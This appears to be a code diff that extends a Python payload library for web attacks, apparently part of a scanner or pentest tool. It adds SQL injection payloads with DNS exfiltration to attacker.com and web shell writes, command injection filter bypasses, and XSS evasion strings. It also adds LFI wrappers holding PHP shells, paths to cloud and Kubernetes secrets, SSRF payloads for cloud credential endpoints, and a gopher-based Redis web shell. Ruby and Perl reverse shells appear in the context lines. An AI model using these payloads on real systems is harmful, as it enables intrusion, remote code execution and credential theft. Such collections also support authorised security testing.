@@ -117,7 +117,81 @@ class Payloads:
         "' UNION SELECT load_file('/etc/passwd'),2,3 --",
         "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
     ]
-    
+
+    # H1: SQLi DNS Exfiltration (MySQL, MSSQL, Oracle, PostgreSQL)
+    SQLI_DNS_EXFIL = [
+        "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a')) --",
+        "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.attacker.com\\\\a')) --",
+        "'; EXEC master..xp_dirtree '\\\\attacker.com\\a' --",
+        "'; EXEC master..xp_subdirs '\\\\attacker.com\\a' --",
+        "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL --",
+        "' AND DBMS_LDAP.INIT(((SELECT user FROM dual)||'.attacker.com'),80) IS NOT NULL --",
+        "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/\">%remote;]>'),'/l') FROM dual --",
+        "COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'",
+    ]
+
+    # H1: SQLi Header/Cookie Injection payloads
+    SQLI_HEADER_PAYLOADS = [
+        "' OR '1'='1' --",
+        "' UNION SELECT @@version --",
+        "' AND SLEEP(5) --",
+        "' OR SLEEP(5)#",
+        "1' AND 1=CONVERT(int,@@version) --",
+        "1; WAITFOR DELAY '0:0:5' --",
+    ]
+
+    # H1: SQLi Charset Bypass (GBK multi-byte, UTF-7)
+    SQLI_CHARSET_BYPASS = [
+        "%bf%27 OR 1=1 --",           # GBK multi-byte eats backslash
+        "%bf%5c' OR 1=1 --",          # SHIFT-JIS bypass
+        "%a1%27 OR 1=1 --",           # Big5 bypass
+        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",  # UTF-7
+        "' OR 1=1 --".encode().hex(),  # Hex-encoded
+    ]
+
+    # H1: SQLi Stored Procedure / File Ops
+    SQLI_STORED_PROC = [
+        "'; EXEC xp_cmdshell('whoami') --",
+        "'; EXEC xp_cmdshell('dir') --",
+        "'; EXEC sp_makewebtask '/var/www/html/out.html','SELECT * FROM users' --",
+        "' UNION SELECT pg_read_file('/etc/passwd',0,1000) --",
+        "' UNION SELECT pg_ls_dir('/etc') --",
+        "' UNION SELECT lo_import('/etc/passwd') --",
+        "' UNION SELECT 1,2,'<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --",
+        "' UNION SELECT 1,2,3 INTO DUMPFILE '/var/www/html/shell.php' --",
+        "' UNION SELECT 1 INTO OUTFILE '/tmp/test.txt' --",
+    ]
+
+    # H1: SQLi Boolean-based Blind
+    SQLI_BOOLEAN_BLIND = [
+        "' AND 1=1 --", "' AND 1=2 --",
+        "' AND SUBSTRING(@@version,1,1)='5' --",
+        "' AND (SELECT COUNT(*) FROM users)>0 --",
+        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
+        "' AND (SELECT LENGTH(database()))>0 --",
+        "' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a' --",
+        "1 AND 1=1", "1 AND 1=2",
+        "1' AND (SELECT 1 FROM dual WHERE 1=1) --",
+        "1' AND (SELECT 1 FROM dual WHERE 1=2) --",
+    ]
+
+    # H1: SQLi Second-Order / Stacked Queries
+    SQLI_ADVANCED = [
+        "'; INSERT INTO users(username,password) VALUES('hacker','pass') --",
+        "'; UPDATE users SET password='hacked' WHERE username='admin' --",
+        "'; CREATE TABLE test(data VARCHAR(100)) --",
+        "' OR 1=1; -- ", "' OR ''='",
+        "'-'", "' '", "'&'", "'^'", "'*'",
+        "' OR ''-'", "' OR '' '", "' OR ''^'",
+        "' OR ''&'", "' OR ''*'", "' OR 0=0 --",
+        "' OR 0=0 #", "' OR 0=0/*", "') OR ('x'='x",
+        "') OR ('x')=('x", "' HAVING 1=1 --",
+        "' GROUP BY table_name HAVING 1=1 --",
+        "' ORDER BY 1 --", "' ORDER BY 2 --",
+        "' ORDER BY 3 --", "' ORDER BY 100 --",
+        "1' ORDER BY 1,2,3 --", "1' ORDER BY 1,2,3,4 --",
+    ]
+
     # NoSQL Injection
     NOSQL_PAYLOADS = [
         '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
@@ -146,6 +220,43 @@ class Payloads:
         "; ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
         "; perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
     ]
+
+    # H3: Command Injection - $IFS Bypass
+    CMDI_IFS_BYPASS = [
+        "cat$IFS/etc/passwd", "cat${IFS}/etc/passwd", "cat$IFS$9/etc/passwd",
+        "ls$IFS-la", "id$IFS", "whoami$IFS",
+        "{cat,/etc/passwd}", "{ls,-la,/}", "{/bin/bash,-i}",
+        "cat</etc/passwd", "cat<>/etc/passwd",
+        "X=$'cat\\x20/etc/passwd'&&$X",
+    ]
+
+    # H3: Command Injection - Wildcard/Glob Bypass
+    CMDI_WILDCARD_BYPASS = [
+        "/bin/ca? /etc/pas?wd", "/bin/ca* /etc/pas*wd",
+        "cat /et?/p?ss??", "/???/??t /???/??ss??",
+        "/???/b??h", "/???/b?n/bas?",
+        "cat /etc/passw[a-z]", "/b[i]n/c[a]t /e[t]c/p[a]sswd",
+    ]
+
+    # H3: Command Injection - Encoding Bypass
+    CMDI_ENCODING_BYPASS = [
+        "$'\\x63\\x61\\x74' /etc/passwd",  # hex for 'cat'
+        "$'\\x69\\x64'",  # hex for 'id'
+        "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'",  # hex for 'whoami'
+        "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)",  # base64 for 'cat /etc/passwd'
+        "$(echo aWQ=|base64 -d)",  # base64 for 'id'
+        "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
+        "cat ${HOME}/../../../etc/passwd",
+        "${PATH%%:*}/../cat /etc/passwd",
+    ]
+
+    # H3: Command Injection - Newline / Separator Bypass
+    CMDI_NEWLINE_BYPASS = [
+        "%0aid", "%0A id", "%0a cat /etc/passwd", "%0d%0a id",
+        "\\nid", "\\n cat /etc/passwd",
+        "%1aid", "%1a cat /etc/passwd",
+        ";%00id", "|%00id",
+    ]
     
     # XSS - Advanced
     XSS_PAYLOADS = [
@@ -172,6 +283,81 @@ class Payloads:
         "<isindex type=image src=1 onerror=alert(1)>",
         "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
     ]
+
+    # H2: XSS Framework-Specific Payloads
+    XSS_FRAMEWORK_PAYLOADS = [
+        # AngularJS
+        "{{constructor.constructor('alert(1)')()}}",
+        "{{$on.constructor('alert(1)')()}}",
+        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
+        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
+        # Vue.js
+        "{{_c.constructor('alert(1)')()}}",
+        '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
+        "{{constructor.constructor('alert(1)')()}}",
+        # React dangerouslySetInnerHTML
+        '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}',
+        # Mavo
+        "[7*7]", "[self.alert(1)]", "[Math.max(alert(1))]",
+    ]
+
+    # H2: XSS DOM Clobbering
+    XSS_DOM_CLOBBERING = [
+        '<img name=getElementById><img name=getElementById>',
+        '<form id=document><img name=cookie>',
+        '<a id=defaultAction href=javascript:alert(1)>',
+        '<img id=documentLinks>',
+        '<form id=location href=javascript:alert(1)>',
+        '<input name=action type=submit formaction=javascript:alert(1)>',
+    ]
+
+    # H2: XSS Encoding / Bypass
+    XSS_ENCODING_BYPASS = [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<SCRIPT>alert(1)</SCRIPT>",
+        "<ScRiPt>alert(1)</sCrIpT>",
+        "<script>alert`1`</script>",
+        "<svg/onload=alert(1)>",
+        "<svg onload=alert&lpar;1&rpar;>",
+        '<img src=x onerror="&#x61;lert(1)">',
+        '<img src=x onerror="al\\u0065rt(1)">',
+        "<img src=x onerror=\\u0061lert(1)>",
+        "javas\tcript:alert(1)",
+        "java%0ascript:alert(1)",
+        "java%0dscript:alert(1)",
+        "java%09script:alert(1)",
+        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
+        "<svg><script>alert&#40;1&#41;</script></svg>",
+    ]
+
+    # H2: XSS Markdown / CSS / JSON Hijacking
+    XSS_MARKDOWN_CSS = [
+        "[click](javascript:alert(1))",
+        "![img](x\" onerror=\"alert(1))",
+        "[a](<javascript:alert(1)>)",
+        "![a]('onerror='alert(1))",
+        '<style>@import url("http://attacker.com/?exfil")</style>',
+        '<div style="background:url(javascript:alert(1))">',
+        '<link rel=stylesheet href=http://attacker.com/evil.css>',
+        '<script src="http://attacker.com/data.json">',
+    ]
+
+    # H2: XSS Event Handlers (comprehensive)
+    XSS_EVENT_HANDLERS = [
+        "<video src=x onerror=alert(1)>",
+        "<audio src=x onerror=alert(1)>",
+        "<video><source onerror=alert(1)>",
+        "<body onpageshow=alert(1)>",
+        "<body onfocus=alert(1)>",
+        "<body onhashchange=alert(1)>",
+        "<body onresize=alert(1)>",
+        "<select onfocus=alert(1) autofocus>",
+        "<textarea onfocus=alert(1) autofocus>",
+        "<keygen onfocus=alert(1) autofocus>",
+        "<video/poster/onerror=alert(1)>",
+        '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a>',
+        "<button popovertarget=x>Click</button><div popover id=x onbeforetoggle=alert(1)>1</div>",
+    ]
     
     # LFI/RFI - Advanced
     LFI_PAYLOADS = [
@@ -192,6 +378,56 @@ class Payloads:
         "../../../var/log/nginx/access.log",
         "../../../proc/self/environ",
         "../../../proc/self/cmdline",
+    ]
+
+    # H4: LFI Advanced Wrappers
+    LFI_ADVANCED_WRAPPERS = [
+        "zip:///tmp/uploaded.zip%23shell.php",
+        "phar:///tmp/test.phar/test.php",
+        "glob:///etc/*",
+        "glob:///var/www/*",
+        "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
+        "php://filter/read=string.rot13/resource=index.php",
+        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
+        "php://filter/convert.base64-decode/resource=data://plain/base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
+    ]
+
+    # H4: LFI Session/Log Poisoning Targets
+    LFI_POISONING_TARGETS = [
+        "/tmp/sess_SESSIONID",
+        "/var/lib/php/sessions/sess_SESSIONID",
+        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
+        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
+        "/var/log/syslog", "/var/log/auth.log",
+        "/var/log/mail.log", "/var/log/httpd/access_log",
+        # Rotated logs
+        "/var/log/apache2/access.log.1", "/var/log/apache2/access.log.2",
+        "/var/log/nginx/access.log.1", "/var/log/syslog.1",
+    ]
+
+    # H4: LFI Docker/K8s Secret Enumeration
+    LFI_CLOUD_SECRETS = [
+        "/run/secrets/",
+        "/var/run/secrets/kubernetes.io/serviceaccount/token",
+        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
+        "/proc/self/environ",
+        "/proc/self/cgroup",
+        "/proc/1/environ",
+        "/.dockerenv",
+        "/etc/kubernetes/admin.conf",
+        "/etc/kubernetes/kubelet.conf",
+        "/root/.kube/config",
+        "/home/user/.aws/credentials",
+        "/home/user/.ssh/id_rsa",
+        "/proc/self/mountinfo",
+    ]
+
+    # H4: LFI pearcmd.php exploitation
+    LFI_PEARCMD = [
+        "?+config-create+/&file=/usr/local/lib/php/pearcmd.php",
+        "?+-c+/tmp/shell.php+-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&file=/usr/local/lib/php/pearcmd.php",
     ]
     
     RFI_PAYLOADS = [
@@ -215,6 +451,63 @@ class Payloads:
         "http://169.254.169.254/latest/user-data",
         "http://instance-data/latest/meta-data/",
         "http://100.100.100.200/latest/meta-data/",
+    ]
+
+    # H5: SSRF Redirect Chain
+    SSRF_REDIRECT_CHAIN = [
+        "http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/",
+        "http://attacker.com/redirect?to=http://127.0.0.1/admin",
+        "http://attacker.com/redirect?to=http://localhost:8080/",
+    ]
+
+    # H5: SSRF Protocol Smuggling (gopher/dict)
+    SSRF_PROTOCOL_SMUGGLING = [
+        "gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A",
+        "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ASAVE%0D%0A",
+        "gopher://127.0.0.1:11211/_stats%0D%0A",
+        "gopher://127.0.0.1:11211/_set%20pwned%200%2060%204%0D%0Atest%0D%0A",
+        "gopher://127.0.0.1:9000/_FCGI",
+        "dict://127.0.0.1:6379/INFO",
+        "dict://127.0.0.1:11211/stats",
+    ]
+
+    # H5: SSRF Cloud Metadata Endpoints
+    SSRF_CLOUD_METADATA = [
+        # AWS
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/meta-data/hostname",
+        "http://169.254.169.254/latest/meta-data/local-ipv4",
+        "http://169.254.169.254/latest/meta-data/public-ipv4",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "http://169.254.170.2/v2/credentials",
+        # GCP
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        # Azure
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        # DigitalOcean
+        "http://169.254.169.254/metadata/v1/",
+        "http://169.254.169.254/metadata/v1/id",
+        # Oracle Cloud
+        "http://169.254.169.254/opc/v2/instance/",
+        # Alibaba
+        "http://100.100.100.200/latest/meta-data/",
+    ]
+
+    # H5: SSRF IP Obfuscation Variants
+    SSRF_IP_BYPASS = [
+        "http://0x7f000001", "http://0177.0.0.1",
+        "http://2130706433", "http://127.1", "http://127.0.1",
+        "http://0:80", "http://[::ffff:127.0.0.1]",
+        "http://[0:0:0:0:0:ffff:127.0.0.1]",
+        "http://127.0.0.1.nip.io", "http://localtest.me",
+        "http://spoofed.burpcollaborator.net",
+        "http://customer1.app/login#@evil.com/",
+        "http://evil.com@127.0.0.1/",
+        "http://127.0.0.1%2523@evil.com/",
     ]
     
     # SSTI - Advanced
